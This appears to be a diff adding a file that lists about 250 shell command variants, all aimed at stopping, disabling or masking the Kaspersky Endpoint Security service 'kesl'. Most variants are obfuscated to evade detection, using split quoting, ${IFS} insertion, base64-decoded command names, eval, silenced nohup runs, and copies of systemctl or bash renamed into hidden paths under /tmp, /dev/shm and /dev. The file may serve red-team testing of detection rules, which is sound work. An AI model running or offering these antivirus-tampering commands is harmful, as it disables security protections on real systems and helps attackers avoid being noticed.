@@ -1,0 +1,252 @@
+/bin/bash -c "systemctl 'stop' kesl && systemctl disable kesl"
+/bin/bash -c "systemctl stop 'kesl' && systemctl disable kesl"
+/bin/bash -c "systemctl stop ke''sl && systemctl disable kesl"
+/bin/bash -c "systemctl st'op' kesl && systemctl disable kesl"
+/bin/bash -c "systemctl stop k"e"sl && systemctl disable kesl"
+/bin/bash -c "systemctl stop ${IFS}kesl && systemctl disable kesl"
+/bin/bash -c "systemctl stop kesl${IFS}&& systemctl disable kesl"
+/bin/bash -c "systemctl stop kesl ; systemctl disable kesl"
+/bin/bash -c "systemctl stop kesl && systemctl 'disable' kesl"
+/bin/bash -c "systemctl stop kesl && systemctl dis"able" kesl"
+/bin/bash -c "systemctl stop kesl && systemctl di''sable kesl"
+/bin/bash -c "systemctl stop kesl && systemctl disable ke''sl"
+/bin/bash -c "systemctl st"op" kesl && systemctl disable kesl"
+/bin/bash -c "systemctl stop k${IFS}esl && systemctl disable kesl"
+/bin/bash -c "systemctl stop kesl && systemctl disa${IFS}ble kesl"
+/bin/bash -c "systemctl stop kesl && systemctl disable k${IFS}esl"
+/bin/bash -c "systemctl stop kesl && systemctl disable ${IFS}kesl"
+/bin/bash -c "systemctl stop kesl && systemctl disable kesl${IFS}"
+/bin/bash -c "systemctl stop kesl && systemctl disable kesl ;"
+/bin/bash -c "systemctl stop kesl && systemctl dis$'a'ble kesl"
+/bin/bash -c "systemctl stop ke$'s'l && systemctl disable kesl"
+/bin/bash -c "systemctl s$'t'op kesl && systemctl disable kesl"
+/bin/bash -c "systemctl stop kesl && systemctl d$'i'sable kesl"
+/bin/bash -c "systemctl stop kesl && systemctl disable k$'e'sl"
+/bin/bash -c "systemctl stop kesl && systemctl disable ke$'s'l"
+/bin/bash -c "systemctl stop kesl && systemctl disable k"es"l"
+/bin/bash -c "systemctl stop k"es"l && systemctl disable kesl"
+/bin/bash -c "systemctl stop kesl && systemctl dis"ab"le kesl"
+/bin/bash -c "systemctl stop kesl && systemctl di"sa"ble kesl"
+/bin/bash -c "systemctl stop kesl && systemctl disa"bl"e kesl"
+/bin/bash -c "systemctl stop kesl && systemctl disable ke"sl""
+/bin/bash -c "systemctl stop kesl && systemctl disable k"e"sl"
+/bin/bash -c "systemctl stop kesl && systemctl disable k'e'sl"
+/bin/bash -c "systemctl stop kesl && systemctl disable k""esl"
+/bin/bash -c "systemctl stop kesl && systemctl disable kes""l"
+/bin/bash -c "systemctl stop kesl && systemctl disable ke''sl"
+/bin/bash -c "systemctl stop kesl && systemctl disable k''esl"
+/bin/bash -c "systemctl stop kesl && systemctl disable kesl''"
+/bin/bash -c "systemctl stop kesl && systemctl disable ''kesl"
+/bin/bash -c "systemctl stop kesl && systemctl disable ${IFS}${IFS}kesl"
+/bin/bash -c "systemctl stop ${IFS}${IFS}kesl && systemctl disable kesl"
+/bin/bash -c "systemctl stop kesl && systemctl disable ke${IFS}sl"
+/bin/bash -c "systemctl stop ke${IFS}sl && systemctl disable kesl"
+/bin/bash -c "systemctl stop kesl && systemctl disa${IFS}${IFS}ble kesl"
+/bin/bash -c "systemctl stop kesl && systemctl dis${IFS}able kesl"
+/bin/bash -c "systemctl stop kesl && systemctl d${IFS}isable kesl"
+/bin/bash -c "systemctl stop kesl && systemctl disable k${IFS}${IFS}esl"
+/bin/bash -c "systemctl stop kesl && systemctl disable ke${IFS}${IFS}sl"
+/bin/bash -c "systemctl stop kesl && systemctl disable kes${IFS}l"
+/bin/bash -c "systemctl stop kesl && systemctl disable ke${IFS}s${IFS}l"
+/bin/bash -c "systemctl --now stop kesl"
+/bin/bash -c "systemctl --force stop kesl"
+/bin/bash -c "systemctl --no-block stop kesl"
+/bin/bash -c "systemctl --quiet stop kesl"
+/bin/bash -c "systemctl --quiet disable kesl"
+/bin/bash -c "systemctl --now disable kesl"
+/bin/bash -c "systemctl --force disable kesl"
+/bin/bash -c "systemctl --no-block disable kesl"
+/bin/bash -c "systemctl --now stop kesl && systemctl --now disable kesl"
+/bin/bash -c "systemctl stop kesl.service && systemctl disable kesl.service"
+/bin/bash -c "systemctl --now mask kesl.service"
+/bin/bash -c "systemctl mask kesl && systemctl stop kesl"
+/bin/bash -c "systemctl disable --now kesl"
+/bin/bash -c "systemctl stop --quiet kesl && systemctl disable --quiet kesl"
+/bin/bash -c "systemctl --now disable kesl.service"
+/bin/bash -c "systemctl --no-pager stop kesl && systemctl --no-pager disable kesl"
+/bin/bash -c "env SYSTEMD_LOG_LEVEL=emerg systemctl stop kesl && systemctl disable kesl"
+/bin/bash -c "/usr/bin/systemctl stop kesl && /usr/bin/systemctl disable kesl"
+/bin/bash -c "/bin/systemctl stop kesl && /bin/systemctl disable kesl"
+/bin/bash -c "exec systemctl stop kesl && exec systemctl disable kesl"
+/bin/bash -c "$(which systemctl) stop kesl && $(which systemctl) disable kesl"
+/bin/bash -c "systemctl disable kesl && systemctl stop kesl"
+/bin/bash -c "systemctl --runtime stop kesl && systemctl disable kesl"
+/bin/bash -c "systemctl stop kesl.service && systemctl mask kesl.service"
+/bin/bash -c "SYSTEMD_LOG_TARGET=null systemctl stop kesl && systemctl disable kesl"
+/bin/bash -c "SYSTEMD_EDITOR=true systemctl disable kesl && systemctl stop kesl"
+/bin/bash -c "nohup systemctl stop kesl >/dev/null 2>&1 &"
+/bin/bash -c "nohup systemctl disable kesl >/dev/null 2>&1 &"
+/bin/bash -c "timeout 2 systemctl stop kesl && timeout 2 systemctl disable kesl"
+/bin/bash -c "stdbuf -oL systemctl stop kesl && stdbuf -oL systemctl disable kesl"
+/bin/bash -c "systemctl --plain stop kesl && systemctl --plain disable kesl"
+/bin/bash -c "LC_ALL=C systemctl stop kesl && LC_ALL=C systemctl disable kesl"
+/bin/bash -c "systemctl stop kesl && sleep 1 && systemctl disable kesl"
+/bin/bash -c "eval 'systemctl stop kesl' && eval 'systemctl disable kesl'"
+/bin/bash -c "echo stop | xargs -I{} systemctl {} kesl && echo disable | xargs -I{} systemctl {} kesl"
+/bin/bash -c "bash -c 'systemctl stop kesl && systemctl disable kesl'"
+/bin/bash -c "/bin/bash -c 'systemctl stop kesl && systemctl disable kesl'"
+/bin/bash -c "command systemctl stop kesl && command systemctl disable kesl"
+/bin/bash -c "$(echo c3lzdGVtY3Rs | base64 -d) stop kesl && systemctl disable kesl"
+/bin/bash -c "$(echo c3lzdGVtY3Rs | xxd -r -p) stop kesl && systemctl disable kesl"
+/bin/bash -c "$(printf 'systemctl') stop kesl && systemctl disable kesl"
+/bin/bash -c "alias sctl='systemctl'; sctl stop kesl && sctl disable kesl"
+/bin/bash -c "export CMD=systemctl; $CMD stop kesl && $CMD disable kesl"
+/bin/bash -c "bash -c \"systemctl stop kesl\" && bash -c \"systemctl disable kesl\""
+/bin/bash -c "sh -c 'systemctl stop kesl' && sh -c 'systemctl disable kesl'"
+/bin/bash -c "((systemctl stop kesl)); ((systemctl disable kesl))"
+/bin/bash -c "for i in stop disable; do systemctl \$i kesl; done"
+/bin/bash -c "IFS=' ' read -ra CMDS <<< 'stop disable'; for cmd in \"\${CMDS[@]}\"; do systemctl \$cmd kesl; done"
+/bin/bash -c "`echo systemctl` stop kesl && `echo systemctl` disable kesl"
+/bin/bash -c "$(echo 'c3lzdGVtY3RsIHN0b3AgS2FzcGVyc2t5' | base64 -d | awk '{print $1, $2, $3}')"
+/bin/bash -c "echo 'systemctl stop kesl && systemctl disable kesl' | bash"
+/bin/bash -c "systemctl disable kesl"
+/bin/bash -c "systemctl stop"
+/bin/bash -c "stop kesl"
+/bin/bash -c "disable kesl"
+bash -c "systemctl disable kesl"
+bash -c "systemctl stop"
+bash -c "stop kesl"
+bash -c "disable kesl"
+/bin/bash -c "systemctl disable"
+/bin/bash -c "disable"
+/bin/bash -c "stop"
+/bin/bash -c "kesl stop"
+/bin/bash -c "kesl disable"
+bash -c "kesl stop"
+bash -c "kesl disable"
+bash -c "systemctl"
+/bin/bash -c "kesl"
+/bin/bash -c ""
+systemctl stop kesl
+systemctl disable kesl
+systemctl disable
+systemctl stop
+stop kesl
+disable kesl
+stop
+disable
+kesl stop
+kesl disable
+kesl
+/bin/bash -c "systemctl"
+/bin/bash -c "systemctl stop kesl"
+/bin/bash -c "stop kesl && disable kesl"
+bash -c "systemctl stop kesl"
+bash -c "stop kesl && disable kesl"
+/bin/sh -c "systemctl stop kesl"
+/bin/sh -c "disable kesl"
+sh -c "stop kesl"
+sh -c "disable kesl"
+sh -c "systemctl disable kesl"
+sh -c "systemctl stop"
+systemctl
+/usr/bin/systemctl stop kesl
+/usr/bin/systemctl disable kesl
+/usr/bin/systemctl stop
+/usr/bin/systemctl disable
+/usr/bin/systemctl
+/usr/bin/bash -c "systemctl stop"
+/usr/bin/bash -c "disable kesl"
+sudo systemctl stop kesl
+sudo systemctl disable kesl
+/bin/bash -c "systemctl disable kesl && systemctl stop kesl"
+/bin/bash -c "systemctl disable kesl ; systemctl stop kesl"
+/bin/bash -c "systemctl stop kesl ; systemctl disable kesl"
+/bin/bash -c "systemctl stop kesl && disable kesl systemctl"
+/bin/bash -c "disable kesl && systemctl stop kesl"
+/bin/bash -c "disable kesl ; systemctl stop kesl"
+/bin/bash -c "stop kesl ; systemctl disable kesl"
+/bin/bash -c "disable kesl && stop kesl systemctl"
+/bin/bash -c "kesl stop && systemctl kesl disable"
+/bin/bash -c "kesl disable && systemctl stop kesl"
+/bin/bash -c "systemctl kesl stop && systemctl kesl disable"
+/bin/bash -c "kesl systemctl stop && kesl systemctl disable"
+/bin/bash -c "systemctl stop kesl && disable kesl"
+/bin/bash -c "disable kesl && systemctl kesl stop"
+/bin/bash -c "stop kesl && kesl disable systemctl"
+/bin/bash -c "stop systemctl kesl && disable kesl systemctl"
+/bin/bash -c "disable systemctl kesl && stop kesl"
+/bin/bash -c "disable && systemctl stop kesl kesl"
+/bin/bash -c "systemctl stop kesl && kesl disable"
+/bin/bash -c "kesl systemctl disable && stop kesl"
+/bin/bash -c "systemctl stop kesl && kesl systemctl disable"
+/bin/bash -c "stop kesl && systemctl kesl disable"
+/bin/bash -c "disable systemctl && stop kesl kesl"
+/bin/bash -c "disable kesl systemctl && stop systemctl kesl"
+/bin/bash -c "kesl systemctl stop && disable systemctl kesl"
+/bin/bash -c "stop systemctl kesl && systemctl disable kesl"
+/bin/bash -c "stop kesl systemctl && disable kesl systemctl"
+/bin/bash -c "kesl stop systemctl && kesl disable systemctl"
+/bin/bash -c "kesl stop systemctl && disable kesl systemctl"
+/bin/bash -c "kesl stop && systemctl disable kesl"
+/bin/bash -c "disable && kesl stop systemctl"
+/bin/bash -c "stop && kesl disable systemctl"
+/bin/bash -c "systemctl kesl disable && stop systemctl kesl"
+/bin/bash -c "disable systemctl kesl && kesl stop"
+/bin/bash -c "systemctl disable kesl && kesl stop systemctl"
+/bin/bash -c "systemctl disable kesl && stop kesl systemctl"
+/bin/bash -c "stop kesl systemctl && kesl systemctl disable"
+/bin/bash -c "systemctl stop kesl && kesl systemctl disable"
+/bin/bash -c "kesl systemctl stop && disable systemctl kesl"
+/bin/bash -c "stop kesl && kesl disable systemctl"
+/bin/bash -c "systemctl stop kesl && systemctl kesl disable"
+/bin/bash -c "systemctl kesl stop && disable kesl"
+/bin/bash -c "kesl stop systemctl && systemctl disable kesl"
+/bin/bash -c "disable kesl systemctl && systemctl stop kesl"
+/bin/bash -c "systemctl stop kesl && kesl disable systemctl"
+/bin/bash -c "stop kesl && systemctl disable kesl && echo done"
+/bin/bash -c "disable kesl && echo done && systemctl stop kesl"
+/bin/bash -c "systemctl stop kesl && (systemctl disable kesl)"
+/bin/bash -c "(systemctl disable kesl) && systemctl stop kesl"
+/bin/bash -c "(disable kesl && systemctl stop kesl)"
+cp /bin/systemctl /tmp/t; /tmp/t stop kesl && /tmp/t disable kesl
+cp /usr/bin/systemctl /tmp/t; /tmp/t stop kesl && /tmp/t disable kesl
+cp $(which systemctl) /tmp/t; /tmp/t stop kesl && /tmp/t disable kesl
+cp /bin/bash /tmp/shx; /tmp/shx -c "systemctl stop kesl && systemctl disable kesl"
+install /bin/systemctl /tmp/t; /tmp/t stop kesl && /tmp/t disable kesl
+cp /bin/systemctl ./svc; ./svc stop kesl && ./svc disable kesl
+cp /usr/bin/systemctl ./sys; ./sys stop kesl && ./sys disable kesl
+cp /bin/bash /dev/shx && chmod +x /dev/shx; /dev/shx -c "systemctl stop kesl && systemctl disable kesl"
+cp /bin/systemctl /var/tmp/sysx; /var/tmp/sysx stop kesl && /var/tmp/sysx disable kesl
+cp $(command -v systemctl) ./sc; ./sc stop kesl && ./sc disable kesl
+cp /usr/bin/systemctl /tmp/.hidden; /tmp/.hidden stop kesl && /tmp/.hidden disable kesl
+cp /bin/bash /tmp/mybash; /tmp/mybash -c "systemctl stop kesl && systemctl disable kesl"
+cp /bin/systemctl /dev/shm/sysd; /dev/shm/sysd stop kesl && /dev/shm/sysd disable kesl
+cp /usr/bin/systemctl /var/tmp/x; /var/tmp/x stop kesl && /var/tmp/x disable kesl
+cp $(which systemctl) /tmp/xyz; /tmp/xyz stop kesl && /tmp/xyz disable kesl
+cp /bin/bash /tmp/bsh; /tmp/bsh -c "systemctl stop kesl && systemctl disable kesl"
+cp /bin/systemctl /tmp/run; chmod +x /tmp/run; /tmp/run stop kesl && /tmp/run disable kesl
+cp /usr/bin/systemctl /tmp/0xdead; /tmp/0xdead stop kesl && /tmp/0xdead disable kesl
+cp /bin/systemctl /tmp/🧠; /tmp/🧠 stop kesl && /tmp/🧠 disable kesl
+cp /bin/systemctl ./kstop; ./kstop stop kesl && ./kstop disable kesl
+cp $(which systemctl) /tmp/_svc; /tmp/_svc stop kesl && /tmp/_svc disable kesl
+cp /bin/bash /tmp/bexec; /tmp/bexec -c "systemctl stop kesl && systemctl disable kesl"
+cp /usr/bin/systemctl /var/run/tmpx; /var/run/tmpx stop kesl && /var/run/tmpx disable kesl
+cp /bin/systemctl /tmp/$RANDOM; /tmp/$RANDOM stop kesl && /tmp/$RANDOM disable kesl
+cp /usr/bin/systemctl /dev/memctl; /dev/memctl stop kesl && /dev/memctl disable kesl
+cp /bin/systemctl ./c; ./c stop kesl && ./c disable kesl
+cp $(which systemctl) ./a; ./a stop kesl && ./a disable kesl
+cp /bin/systemctl /tmp/🛡️; /tmp/🛡️ stop kesl && /tmp/🛡️ disable kesl
+cp /bin/bash /tmp/secure_exec; /tmp/secure_exec -c "systemctl stop kesl && systemctl disable kesl"
+cp /bin/systemctl /tmp/stopKaspersky; /tmp/stopKaspersky stop kesl && /tmp/stopKaspersky disable kesl
+cp /usr/bin/systemctl /var/tmp/.ks; /var/tmp/.ks stop kesl && /var/tmp/.ks disable kesl
+cp /bin/bash /tmp/.bsh; /tmp/.bsh -c "systemctl stop kesl && systemctl disable kesl"
+cp /usr/bin/systemctl ./cmd; ./cmd stop kesl && ./cmd disable kesl
+cp /bin/systemctl ./🧬; ./🧬 stop kesl && ./🧬 disable kesl
+cp /bin/systemctl /tmp/__sys__; /tmp/__sys__ stop kesl && /tmp/__sys__ disable kesl
+cp /usr/bin/systemctl /tmp/xz; /tmp/xz stop kesl && /tmp/xz disable kesl
+cp $(which systemctl) /tmp/.xhidden; /tmp/.xhidden stop kesl && /tmp/.xhidden disable kesl
+cp /bin/systemctl /dev/kslstop; /dev/kslstop stop kesl && /dev/kslstop disable kesl
+cp /bin/bash ./runbash; ./runbash -c "systemctl stop kesl && systemctl disable kesl"
+cp /bin/systemctl /var/tmp/sys.service; /var/tmp/sys.service stop kesl && /var/tmp/sys.service disable kesl
+cp /bin/systemctl ./sysctl2; ./sysctl2 stop kesl && ./sysctl2 disable kesl
+cp $(command -v systemctl) /tmp/altctl; /tmp/altctl stop kesl && /tmp/altctl disable kesl
+cp /usr/bin/systemctl ./service; ./service stop kesl && ./service disable kesl
+cp /bin/bash /tmp/kstopper; /tmp/kstopper -c "systemctl stop kesl && systemctl disable kesl"
+cp /bin/systemctl ./runner; ./runner stop kesl && ./runner disable kesl
+cp /usr/bin/systemctl ./daemonctl; ./daemonctl stop kesl && ./daemonctl disable kesl
+cp /bin/systemctl ./🧿; ./🧿 stop kesl && ./🧿 disable kesl
+cp /bin/systemctl /tmp/.x; /tmp/.x stop kesl && /tmp/.x disable kesl
+cp $(which systemctl) ./🪛; ./🪛 stop kesl && ./🪛 disable kesl
+cp /bin/systemctl /tmp/svc1; /tmp/svc1 stop kesl && /tmp/svc1 disable kesl
+cp /bin/systemctl ./bin1; ./bin1 stop kesl && ./bin1 disable kesl
